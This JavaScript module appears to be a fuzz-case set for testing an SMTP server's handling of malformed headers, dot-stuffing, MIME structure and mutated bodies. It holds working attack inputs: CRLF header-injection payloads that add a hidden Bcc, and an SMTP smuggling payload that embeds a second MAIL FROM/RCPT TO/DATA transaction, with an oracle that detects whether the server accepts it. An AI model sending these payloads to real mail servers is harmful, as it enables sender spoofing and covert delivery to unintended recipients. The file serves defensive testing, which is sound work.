'use strict'

const { mutate, HOSTILE_TOKENS } = require('../lib/mutate.js')

const cmd = (line) => ({ type: 'cmd', line })
const raw = (bytes) => ({ type: 'raw', bytes: Buffer.isBuffer(bytes) ? bytes : Buffer.from(bytes) })

const envelope = [cmd('EHLO fuzz.local'), cmd('MAIL FROM:<a@b>'), cmd('RCPT TO:<c@d>'), cmd('DATA')]

function dataBody(body) {
  // body is the message including headers; we terminate with CRLF.CRLF
  return raw(Buffer.from(body + '\r\n.\r\n'))
}

function* headerInjection() {
  yield {
    name: 'header-crlf-inject',
    steps: [...envelope, dataBody('From: a@b\r\nSubject: ok\r\nX-Injected: yes\r\nBcc: leak@evil\r\n\r\nbody')],
  }
  yield {
    name: 'header-bare-lf',
    steps: [...envelope, raw(Buffer.from('From: a@b\nSubject: bare\n\nbody\n.\r\n'))],
  }
  yield {
    name: 'header-bare-cr',
    steps: [...envelope, raw(Buffer.from('From: a@b\rSubject: bare\r\rbody\r.\r\n'))],
  }
  yield {
    name: 'header-no-blank-line',
    steps: [...envelope, dataBody('From: a@b\r\nSubject: nogap\r\nbody starts here')],
  }
  yield {
    name: 'header-giant-value',
    steps: [...envelope, dataBody('Subject: ' + 'A'.repeat(1 << 16) + '\r\n\r\nbody')],
  }
  yield {
    name: 'header-folding-abuse',
    steps: [...envelope, dataBody('Subject: hi\r\n folded\r\n\tmore\r\n\r\nbody')],
  }
  yield {
    name: 'header-folding-extreme',
    steps: [...envelope, dataBody('X-A: 1\r\n' + ' x\r\n'.repeat(10_000) + '\r\nbody')],
  }
  yield {
    name: 'header-null-byte',
    steps: [...envelope, raw(Buffer.from('Subject: nul\0byte\r\n\r\nbody\r\n.\r\n'))],
  }
  yield {
    name: 'header-utf8-name',
    steps: [...envelope, dataBody('Subject: ok\r\nX-\u{1f4a9}: bad\r\n\r\nbody')],
  }
  yield {
    name: 'header-duplicate-200',
    steps: [...envelope, dataBody('From: a@b\r\n' + 'Received: ' + 'r\r\n'.repeat(0) + 'Received: x\r\n'.repeat(200) + '\r\nbody')],
  }
}

// A dot-stuffed "." inside the header section is de-stuffed on receipt; if it is
// re-emitted un-stuffed to a backend it becomes a premature end-of-DATA and the
// rest of the message is read as a second SMTP transaction.
function* hostileHeaders() {
  for (const tok of HOSTILE_TOKENS) {
    yield {
      name: `hostile-name-${tok}`,
      steps: [...envelope, dataBody(`${tok}: v\r\nFrom: a@b\r\n\r\nx`)],
    }
    yield {
      name: `hostile-name-spaced-${tok}`,
      steps: [...envelope, dataBody(`${tok} : v\r\nFrom: a@b\r\n\r\nx`)],
    }
    yield {
      name: `hostile-name-folded-${tok}`,
      steps: [...envelope, dataBody(`${tok}\r\n cont\r\nFrom: a@b\r\n\r\nx`)],
    }
  }
  // the smuggling shape: dot-stuffed terminator in the header block, followed by
  // a complete second transaction that a desynchronised backend would execute
  yield {
    name: 'smuggle-header-section',
    steps: [
      ...envelope,
      dataBody(
        'From: a@b\r\nSubject: x\r\n..\r\nMAIL FROM:<attacker@evil.test>\r\nRCPT TO:<victim@example.test>\r\nDATA\r\nSmuggled\r\n.\r\nTo: c@d\r\n\r\nouter',
      ),
    ],
    // one MAIL FROM was sent as a command; a second "sender OK" means the
    // dot-stuffed line was honoured as end-of-DATA and the tail ran as SMTP
    oracle: (transcript) => {
      const senders = transcript.filter((t) => t.dir === 'S' && t.reply?.code === 250 && /sender/i.test(t.reply?.text ?? '')).length
      return senders > 1 ? `smuggled transaction accepted (${senders} sender replies for 1 MAIL FROM)` : null
    },
  }
  yield {
    name: 'smuggle-cr-split',
    steps: [...envelope, dataBody('From: a@b\r\nSubject: safe\rBcc: victim@example.test\r\n\r\nx')],
  }
}

function* dotStuffing() {
  yield { name: 'lone-dot', steps: [...envelope, raw(Buffer.from('.\r\n'))] }
  yield { name: 'dot-on-first-line', steps: [...envelope, raw(Buffer.from('.evil\r\n.\r\n'))] }
  yield {
    name: 'dot-cr-only',
    steps: [...envelope, raw(Buffer.from('Subject: x\r\n\r\nbody\r\n.\rmore\r\n.\r\n'))],
  }
  yield {
    name: 'multi-dot-sequences',
    steps: [...envelope, raw(Buffer.from('a\r\n..b\r\n.\r\n.\r\n.c\r\n.\r\n'))],
  }
  yield {
    name: 'unterminated',
    steps: [...envelope, raw(Buffer.from('Subject: x\r\n\r\nbody never ends'))],
  }
  yield {
    name: 'huge-body',
    steps: [...envelope, dataBody('Subject: big\r\n\r\n' + 'x'.repeat(1 << 20))],
  }
  yield {
    name: 'crlf-mismatch-body',
    steps: [...envelope, raw(Buffer.from('Subject: x\r\n\nbody mixed\rline-endings\n.\r\n'))],
  }
}

function* mimeShape() {
  const boundary = 'BOUND'
  const base = (parts) =>
    [
      `MIME-Version: 1.0`,
      `Content-Type: multipart/mixed; boundary="${boundary}"`,
      '',
      ...parts,
      `--${boundary}--`,
    ].join('\r\n')

  yield {
    name: 'mime-no-end-boundary',
    steps: [...envelope, dataBody(base([`--${boundary}`, 'Content-Type: text/plain', '', 'hi']).replace(`--${boundary}--`, ''))],
  }
  yield {
    name: 'mime-mismatched-boundary',
    steps: [...envelope, dataBody(`MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary="A"\r\n\r\n--B\r\nContent-Type: text/plain\r\n\r\nx\r\n--B--`)],
  }
  yield {
    name: 'mime-nested-deep',
    steps: [
      ...envelope,
      dataBody(
        (() => {
          let s = 'leaf body'
          for (let i = 0; i < 50; i++) {
            const b = 'B' + i
            s = `Content-Type: multipart/mixed; boundary="${b}"\r\n\r\n--${b}\r\n${s}\r\n--${b}--`
          }
          return 'MIME-Version: 1.0\r\n' + s
        })(),
      ),
    ],
  }
  yield {
    name: 'mime-base64-malformed',
    steps: [...envelope, dataBody(`MIME-Version: 1.0\r\nContent-Transfer-Encoding: base64\r\nContent-Type: application/octet-stream\r\n\r\n!!!notbase64!!!`)],
  }
  yield {
    name: 'mime-qp-malformed',
    steps: [...envelope, dataBody(`MIME-Version: 1.0\r\nContent-Transfer-Encoding: quoted-printable\r\nContent-Type: text/plain\r\n\r\n=ZZ=GG=\r\n=`)],
  }
  yield {
    name: 'mime-content-type-pathological',
    steps: [...envelope, dataBody(`Content-Type: text/plain; charset="${'a'.repeat(8192)}"; name=${'b'.repeat(8192)}\r\n\r\nbody`)],
  }
}

function* mutatedBodies(rng) {
  const seeds = [
    'Subject: test\r\nFrom: a@b\r\nTo: c@d\r\n\r\nHello world',
    'MIME-Version: 1.0\r\nContent-Type: multipart/alternative; boundary="x"\r\n\r\n--x\r\nContent-Type: text/plain\r\n\r\nA\r\n--x\r\nContent-Type: text/html\r\n\r\n<b>A</b>\r\n--x--',
  ]
  for (let i = 0; i < 15; i++) {
    const seed = seeds[i % seeds.length]
    const mutated = mutate(Buffer.from(seed), { rng })
    yield {
      name: `mutated-body-${i}`,
      steps: [...envelope, raw(Buffer.concat([mutated, Buffer.from('\r\n.\r\n')]))],
    }
  }
}

function* all(rng) {
  yield* headerInjection()
  yield* hostileHeaders()
  yield* dotStuffing()
  yield* mimeShape()
  yield* mutatedBodies(rng)
}

module.exports = { all }
